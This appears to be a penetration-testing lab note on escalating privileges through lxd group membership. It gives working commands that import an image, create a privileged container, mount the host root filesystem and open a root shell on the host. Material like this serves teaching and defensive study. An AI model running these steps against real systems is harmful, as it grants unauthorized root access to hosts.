### LXD

```bash
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
From here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container.
```bash
container-user@nix02:~$ ls ContainerImages

ubuntu-template.tar.xz
```
Such templates often do not have passwords, especially if they are uncomplicated test environments
```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```
After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.
```bash
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`
```bash
lxc start privesc
lxc exec privesc /bin/bash

root@nix02:~# ls -l /mnt/root
```